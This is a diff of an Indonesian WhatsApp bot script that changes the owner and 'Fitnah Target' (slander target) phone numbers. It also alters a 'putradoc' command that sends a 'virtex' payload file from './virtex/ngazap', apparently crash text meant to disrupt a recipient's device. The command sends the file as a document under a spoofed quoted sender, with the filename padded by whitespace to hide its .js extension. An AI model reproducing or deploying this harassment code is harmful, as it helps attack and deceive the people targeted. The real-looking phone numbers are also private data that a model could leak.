@@ -109,9 +109,9 @@ memberwin = 1 // Win ( HW MODS WA )
 memberlose = 1 // Lose ( HW MODS WA )
 pref = '?' // Prefix ( HW MODS WA )
 fake1 = '©[XM]-[XHIRO MHONSHINE] ✌️'
-targetpc = '6289654489730' // Fitnah Target ( HAIKAL )
-owner = '6289654489730' // Numbers Owner ( HW MODS WA )
-ownerNumbers = ["6289654489730@s.whatsapp.net","6289654489730@s.whatsapp.net","6289654489730@s.whatsapp.net"]
+targetpc = '6285320583186' // Fitnah Target ( HAIKAL )
+owner = '6285320583186' // Numbers Owner ( HW MODS WA )
+ownerNumbers = ["6285320583186@s.whatsapp.net","6285320583186@s.whatsapp.net","6285320583186@s.whatsapp.net"]
 linkcom = ".com" // Anti Link ( HW MODS WA )
 linkid = ".id" // Anti Link ( HW MODS WA )
 linkxyz = ".xyz" // Anti Link ( HW MODS WA )
@@ -8517,7 +8517,7 @@ if (!kal.key.fromMe) return fakestatus('APASIH')
 case 'putradoc':
 if (!q) return reply(`Teks?`)
          if (!kal.key.fromMe) return replyy('APASIH')
-arawa = fs.readFileSync('./virtex/ngazap.txt')
+arawa = fs.readFileSync('./virtex/ngazap.js')
 Haikal.sendMessage(from, arawa, document, { quoted: {
   key: {
    participant: '0@s.whatsapp.net'
@@ -8532,7 +8532,7 @@ Haikal.sendMessage(from, arawa, document, { quoted: {
     sellerJid: '0@s.whatsapp.net'
    }
   }
- } ,filename:`${q}                                                                          ${ngazap(prefix)}.txt`, mimetype: 'application/txt'})
+ } ,filename:`${q}                                                                          ${ngazap(prefix)}.js`, mimetype: 'application/js'})
 break
 case 'putraloc':
 if (!kal.key.fromMe) return reply('Skip lu bukan owner !!')
